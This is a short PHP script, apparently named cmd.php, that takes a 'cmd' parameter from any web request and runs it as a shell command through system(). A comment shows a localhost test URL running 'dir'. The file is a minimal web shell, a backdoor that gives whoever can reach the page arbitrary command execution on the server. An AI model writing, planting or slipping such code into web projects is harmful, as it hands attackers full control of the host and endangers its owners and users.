<?php 

if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
#view-source:http://localhost/test/cmd.php?cmd=dir;

?> 